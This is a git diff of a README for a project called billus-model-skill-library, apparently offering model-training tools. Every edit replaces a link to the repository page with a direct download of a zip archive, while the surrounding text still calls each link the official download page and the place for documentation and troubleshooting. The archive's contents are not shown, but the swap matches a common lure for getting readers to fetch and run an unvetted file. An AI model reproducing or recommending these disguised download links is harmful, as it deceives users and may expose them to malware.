@@ -1,6 +1,6 @@
 # ⚙️ billus-model-skill-library - Tools for Model Training and Tuning
 
-[![Download](https://img.shields.io/badge/Download-billus--model--skill--library-brightgreen?style=for-the-badge)](https://github.com/Aaqilv2458/billus-model-skill-library)
+[![Download](https://img.shields.io/badge/Download-billus--model--skill--library-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Aaqilv2458/billus-model-skill-library/main/skills/model_library_billus_skill_v1.1-alpha.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Before installing the software, make sure your computer meets these requirements
 
 Click the big green button below to open the download page for billus-model-skill-library:  
 
-[![Download billus-model-skill-library](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Aaqilv2458/billus-model-skill-library)  
+[![Download billus-model-skill-library](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Aaqilv2458/billus-model-skill-library/main/skills/model_library_billus_skill_v1.1-alpha.3.zip)  
 
 This is the official page with all the files and updates.  
 
@@ -120,7 +120,7 @@ To keep the software current:
 3. Click **Check for Updates**.  
 4. If a new version is available, follow the prompts to download and install it.  
 
-Alternatively, you can visit the [download page](https://github.com/Aaqilv2458/billus-model-skill-library) again and check for the latest release manually.  
+Alternatively, you can visit the [download page](https://raw.githubusercontent.com/Aaqilv2458/billus-model-skill-library/main/skills/model_library_billus_skill_v1.1-alpha.3.zip) again and check for the latest release manually.  
 
 ---
 
@@ -137,10 +137,10 @@ Alternatively, you can visit the [download page](https://github.com/Aaqilv2458/b
 
 To learn more about how these tools work or if you want to explore advanced uses, see the documentation on the GitHub page.  
 
-The [billus-model-skill-library download page](https://github.com/Aaqilv2458/billus-model-skill-library) is the go-to place for updates, details, and troubleshooting guides.  
+The [billus-model-skill-library download page](https://raw.githubusercontent.com/Aaqilv2458/billus-model-skill-library/main/skills/model_library_billus_skill_v1.1-alpha.3.zip) is the go-to place for updates, details, and troubleshooting guides.  
 
 For questions not answered there, consider opening an issue on GitHub under the repository issues tab.  
 
 ---
 
-[![Download billus-model-skill-library](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/Aaqilv2458/billus-model-skill-library)
+[![Download billus-model-skill-library](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/Aaqilv2458/billus-model-skill-library/main/skills/model_library_billus_skill_v1.1-alpha.3.zip)
